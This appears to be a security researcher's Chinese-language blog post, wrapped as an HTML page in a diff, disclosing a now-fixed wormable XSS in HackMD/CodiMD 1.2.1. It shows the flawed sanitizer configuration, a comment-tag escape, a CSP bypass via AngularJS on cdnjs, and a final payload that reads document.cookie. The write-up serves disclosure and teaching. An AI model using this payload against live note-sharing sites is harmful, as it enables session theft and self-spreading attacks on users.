@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="在 Web Security 中，我喜歡伺服器端的漏洞更勝於客戶端的漏洞!(當然可以直接拿 shell 的客戶端洞不在此限XD) 因為可以直接控制別人的伺服器對我來說更有趣! 正因如此，我以往的文章對於 XSS 及 CSRF 等相關弱點也較少著墨(仔細翻一下也只有 2018 年 Google CTF 那篇XD)，剛好這次的漏洞小小有趣，秉持著教育及炫耀(?)的心態就來發個文了XD   最近需要自架">
+<meta property="og:type" content="article">
+<meta property="og:title" content="A Wormable XSS on HackMD!">
+<meta property="og:url" content="http://blog.orange.tw/posts/2019-03-a-wormable-xss-on-hackmd/index.html">
+<meta property="og:site_name" content="Orange Tsai">
+<meta property="og:description" content="在 Web Security 中，我喜歡伺服器端的漏洞更勝於客戶端的漏洞!(當然可以直接拿 shell 的客戶端洞不在此限XD) 因為可以直接控制別人的伺服器對我來說更有趣! 正因如此，我以往的文章對於 XSS 及 CSRF 等相關弱點也較少著墨(仔細翻一下也只有 2018 年 Google CTF 那篇XD)，剛好這次的漏洞小小有趣，秉持著教育及炫耀(?)的心態就來發個文了XD   最近需要自架">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2019-03-11T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-20T08:39:10.075Z">
+<meta property="article:author" content="Orange Tsai">
+<meta property="article:tag" content="Hacker, Security, Vulnerability, Web, RCE, SSRF, XSS, CVE">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    
+      <title>A Wormable XSS on HackMD! | Orange Tsai</title>
+    
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-13047966-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-13047966-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Orange Tsai" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  <a class="u-url u-uid" href="/">
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/logo.png" />
+    
+  
+    <div id="title">
+      <h1 class="p-name">Orange Tsai</h1>
+    </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/articles/">Articles</a></li><!--
+   --><!--
+     --><li><a href="/talks/">Talks</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+
+        
+          <hr style='margin: 0px; margin-bottom: 32px; border: 0.5px solid #ccc; '>
+        
+
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        A Wormable XSS on HackMD!
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">🍊 <a href='/about'>Orange Tsai</a></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-03-11T16:00:00.000Z" class="dt-published" itemprop="datePublished">2019-03-12</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>在 Web Security 中，我喜歡伺服器端的漏洞更勝於客戶端的漏洞!(當然可以直接拿 shell 的客戶端洞不在此限XD) 因為可以直接控制別人的伺服器對我來說更有趣! 正因如此，我以往的文章對於 XSS 及 CSRF 等相關弱點也較少著墨(仔細翻一下也只有 2018 年 Google CTF 那篇XD)，剛好這次的漏洞小小有趣，秉持著教育<del>及炫耀(?)</del>的心態就來發個文了XD  </p>
+<p>最近需要自架共筆伺服器，調查了一些市面上支援 Markdown 的共筆平台，最後還是選擇了國產的 <a target="_blank" rel="noopener" href="https://hackmd.io/">HackMD</a>! 當然，對於自己要使用的軟體都會習慣性的檢視一下安全性，否則怎麼敢放心使用? 因此花了約半天對 HackMD 進行了一次原始碼檢測(Code Review)!  </p>
+<p><a target="_blank" rel="noopener" href="https://hackmd.io/">HackMD</a> 是一款由台灣人自行研發的線上 Markdown 共筆系統，除了在台灣資訊圈流行外，也被許多台灣研討會如 COSCUP, g0v 或 HITCON 等當成官方的共筆存放地點，甚至還是 <a target="_blank" rel="noopener" href="https://www.ethereum.org/">Ethereum</a> 的協作平台! 除了雲端使用及企業方案外，整份原始碼也很佛心的開放出來在 <a target="_blank" rel="noopener" href="https://github.com/hackmdio/codimd">GitHub</a> 上(4500 多顆星! 最近也才知道原來 HackMD 在中國及歐洲也有許多死忠用戶!)，算是很回饋台灣資訊社群的一個廠商!  </p>
+<p>平心而論，HackMD 整體程式碼品質不低，所以並沒有甚麼太嚴重的弱點，不過你也知道 XSS 不是那種想防就防得了的問題，綜觀 HackMD 歷年來關於<a target="_blank" rel="noopener" href="https://github.com/hackmdio/codimd/issues?utf8=%E2%9C%93&q=XSS">安全相關的問題</a>，發現都是一些老手法如 <code>javascript:alert(1)</code> 或 <code>onclick</code> , <code>onload</code> 等，所以相較之下這個漏洞算是比較有趣的一個 XSS，視攻擊方式甚至可以達到像是 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Samy_(computer_worm)">Samy Worm</a> 等 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/XSS_worm">XSS 蠕蟲</a>的感染效果!  </p>
+<p><em>P.S. 其實本來沒有要找 XSS 的，但看到寫法就覺得一定有問題，跳下去看後漏洞就自己跑出來了 ╮(╯_╰)╭</em>  </p>
+<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>(以下皆以 <a target="_blank" rel="noopener" href="https://github.com/hackmdio/codimd/tree/1.2.1">CodiMD 版本 1.2.1</a> 來進行解說)  </p>
+<p>最初是看到 HackMD 在前端渲染 Markdown 時的 XSS 防禦所引起我的興趣，由於 HackMD 允許嵌入客製化的網頁標籤，為了防止 XSS 的問題勢必得對 HTML 進行過濾，這裡 HackMD 使用了一個 XSS 防禦函示庫 - <a target="_blank" rel="noopener" href="https://jsxss.com/">npm&#x2F;xss</a> 來防禦! 從相關的文檔及 GitHub 上的 Issue 及星星數觀察看起來是一個很成熟的 XSS 防禦函示庫，找到問題的話也是 0day 等級，不過只是隨手看看而已沒必要還幫幫第三方函示庫找 0day 吧?  </p>
+<p>因此把焦點放到函示庫的使用上，再安全的函示庫碰到不安全的用法也會無用武之地，這也是為什麼要找<a target="_blank" rel="noopener" href="http://devco.re/">專業駭客</a>的緣故!(置入性行銷XD) 整個 HackMD 使用到 npm&#x2F;xss 的位置位於 <a target="_blank" rel="noopener" href="https://github.com/hackmdio/codimd/blob/1.2.1/public/js/render.js">public&#x2F;js&#x2F;render.js</a> 的 <code>preventXSS</code> 中，第一眼看到這段程式碼就直覺一定會有問題!  </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> filterXSSOptions = &#123;</span><br><span class="line">  <span class="attr">allowCommentTag</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">whiteList</span>: whiteList,</span><br><span class="line">  <span class="attr">escapeHtml</span>: <span class="keyword">function</span> (<span class="params">html</span>) &#123;</span><br><span class="line">    <span class="comment">// allow html comment in multiple lines</span></span><br><span class="line">    <span class="keyword">return</span> html.<span class="title function_">replace</span>(<span class="regexp">/&lt;(?!!--)/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/--&gt;/g</span>, <span class="string">&#x27;--&gt;&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/--&gt;/g</span>, <span class="string">&#x27;--&gt;&#x27;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">onIgnoreTag</span>: <span class="keyword">function</span> (<span class="params">tag, html, options</span>) &#123;</span><br><span class="line">    <span class="comment">// allow comment tag</span></span><br><span class="line">    <span class="keyword">if</span> (tag === <span class="string">&#x27;!--&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// do not filter its attributes</span></span><br><span class="line">      <span class="keyword">return</span> html</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">onTagAttr</span>: <span class="keyword">function</span> (<span class="params">tag, name, value, isWhiteAttr</span>) &#123;</span><br><span class="line">    <span class="comment">// allow href and src that match linkRegex</span></span><br><span class="line">    <span class="keyword">if</span> (isWhiteAttr &amp;&amp; (name === <span class="string">&#x27;href&#x27;</span> || name === <span class="string">&#x27;src&#x27;</span>) &amp;&amp; linkRegex.<span class="title function_">test</span>(value)) &#123;</span><br><span class="line">      <span class="keyword">return</span> name + <span class="string">&#x27;=&quot;&#x27;</span> + filterXSS.<span class="title function_">escapeAttrValue</span>(value) + <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// allow data uri in img src</span></span><br><span class="line">    <span class="keyword">if</span> (isWhiteAttr &amp;&amp; (tag === <span class="string">&#x27;img&#x27;</span> &amp;&amp; name === <span class="string">&#x27;src&#x27;</span>) &amp;&amp; dataUriRegex.<span class="title function_">test</span>(value)) &#123;</span><br><span class="line">      <span class="keyword">return</span> name + <span class="string">&#x27;=&quot;&#x27;</span> + filterXSS.<span class="title function_">escapeAttrValue</span>(value) + <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">onIgnoreTagAttr</span>: <span class="keyword">function</span> (<span class="params">tag, name, value, isWhiteAttr</span>) &#123;</span><br><span class="line">    <span class="comment">// allow attr start with &#x27;data-&#x27; or in the whiteListAttr</span></span><br><span class="line">    <span class="keyword">if</span> (name.<span class="title function_">substr</span>(<span class="number">0</span>, <span class="number">5</span>) === <span class="string">&#x27;data-&#x27;</span> || <span class="variable language_">window</span>.<span class="property">whiteListAttr</span>.<span class="title function_">indexOf</span>(name) !== -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// escape its value using built-in escapeAttrValue function</span></span><br><span class="line">      <span class="keyword">return</span> name + <span class="string">&#x27;=&quot;&#x27;</span> + filterXSS.<span class="title function_">escapeAttrValue</span>(value) + <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">preventXSS</span> (<span class="params">html</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">filterXSS</span>(html, filterXSSOptions)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>為了提供開發者可以自由的客製化過濾的處理，npm&#x2F;xss 提供了多個不同的選項給開發者，而其中在 <code>onIgnoreTag</code> 這個 callback 中，開發者判斷了如果是註解的標籤便直接回傳原始的 HTML 內容，在 JavaScript 上的註解也寫得很直白!  </p>
+<blockquote>
+<p>do not filter its attributes</p>
+</blockquote>
+<p>可以想像開發者原本的用意應該是希望保留註解原本的內容! 既然它這麼相信註解中的內容，那我們來看一下是否可以從註解標籤中去汙染 DOM 的渲染! 我們構造如下的 HTML 內容:  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- foo=&quot;bar--&gt;</span> <span class="tag">&lt;<span class="name">s</span>&gt;</span>Hi<span class="tag">&lt;/<span class="name">s</span>&gt;</span>&quot; --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>把 <code>bar--&gt; ...</code> 當成一個屬性的值，並在這個值中使用 <code>--&gt;</code> 去閉合前方的註解標籤，如此一來便輕鬆地繞過只允許信任的 HTML 標籤及屬性，去插入惡意的 HTML 代碼!  </p>
+<h1 id="繞過-CSP-政策"><a href="#繞過-CSP-政策" class="headerlink" title="繞過 CSP 政策"></a>繞過 CSP 政策</h1><p>到這裡，你可能以為已經結束了，閉合前方的 <code>&lt;!--</code> 標籤後再插入 <code>script</code> 標籤去執行任意 JavaScript 代碼! 但事情不是憨人想的那麼簡單，為了防止未知的 XSS 攻擊，HackMD 使用了 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">CSP(Content Security Policy)</a> 去阻擋未授權的 JavaScript 代碼執行! 相關的 CSP 政策如下:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content-security-policy: script-src &#x27;self&#x27; vimeo.com https://gist.github.com www.slideshare.net https://query.yahooapis.com &#x27;unsafe-eval&#x27; https://cdnjs.cloudflare.com https://cdn.mathjax.org https://www.google.com https://apis.google.com https://docs.google.com https://www.dropbox.com https://*.disqus.com https://*.disquscdn.com https://www.google-analytics.com https://stats.g.doubleclick.net https://secure.quantserve.com https://rules.quantcount.com https://pixel.quantserve.com https://js.driftt.com https://embed.small.chat https://static.small.chat https://www.googletagmanager.com https://cdn.ravenjs.com &#x27;nonce-38703614-d766-4dff-954b-57372aafe8bd&#x27; &#x27;sha256-EtvSSxRwce5cLeFBZbvZvDrTiRoyoXbWWwvEVciM5Ag=&#x27; &#x27;sha256-NZb7w9GYJNUrMEidK01d3/DEtYztrtnXC/dQw7agdY4=&#x27; &#x27;sha256-L0TsyAQLAc0koby5DCbFAwFfRs9ZxesA+4xg0QDSrdI=&#x27;; img-src * data:; style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; https://assets-cdn.github.com https://cdnjs.cloudflare.com https://fonts.googleapis.com https://www.google.com https://fonts.gstatic.com https://*.disquscdn.com https://static.small.chat; font-src &#x27;self&#x27; data: https://public.slidesharecdn.com https://cdnjs.cloudflare.com https://fonts.gstatic.com https://*.disquscdn.com; object-src *; media-src *; frame-src *; child-src *; connect-src *; base-uri &#x27;none&#x27;; form-action &#x27;self&#x27; https://www.paypal.com; upgrade-insecure-requests</span><br></pre></td></tr></table></figure>
+
+<p>仔細分析這個 CSP 政策，看到 <code>unsafe-eval</code> 這個關鍵字，第一個想到的是在 2017 年 Black Hat USA 由幾個 Google Security 成員所發表的 <a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf">Breaking XSS mitigations via Script Gadgets</a> 手法! 不過其實不用這麼麻煩，CSP 政策還允許了 <code>https://cdnjs.cloudflare.com/</code> 這個 JavaScript hosting 服務，上方提供了許多第三方函示庫以供引入! 由於這個 CDN 提供商，繞過 CSP 就變成很簡單的一件事情了! 我們可以直接使用 AngularJS 函示庫，配合 <a target="_blank" rel="noopener" href="https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs">Client-Side Template Injection</a> 的方式輕鬆繞過!  </p>
+<p><em>P.S. 如果你對於 CSP 的政策不甚熟悉但還是想檢查自己的網站是否設置正確的話，可以使用 Google 所提供的 <a target="_blank" rel="noopener" href="https://csp-evaluator.withgoogle.com/">CSP Evaluator</a> 來檢測!</em>  </p>
+<h1 id="最終攻擊代碼"><a href="#最終攻擊代碼" class="headerlink" title="最終攻擊代碼"></a>最終攻擊代碼</h1><p>透過註解標籤屬性的跳脫及 CSP 的繞過，最後組出來的攻擊代碼如下:  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- foo=&quot;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line">    &#123;&#123;constructor.constructor(&#x27;alert(document.cookie)&#x27;)()&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">//sssss&quot; --&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>這裡也展示了當與駭客同時編輯一份共筆時，對當前線上文件的所有人發動攻擊:  </p>
+<iframe allowfullscreen="" height="315" src="https://www.youtube.com/embed/GRi2pz6_sGY?controls=0" width="560"></iframe>  
+
+
+  
+
+<p><em>P.S. 這個漏洞已經在最新版 CodiMD 中修復了，詳情可以參考 <a target="_blank" rel="noopener" href="https://github.com/hackmdio/codimd/pull/1112">pull request</a></em></p>
+
+  </div>
+</article>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2009-2024
+    Orange Tsai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/talks/">Talks</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
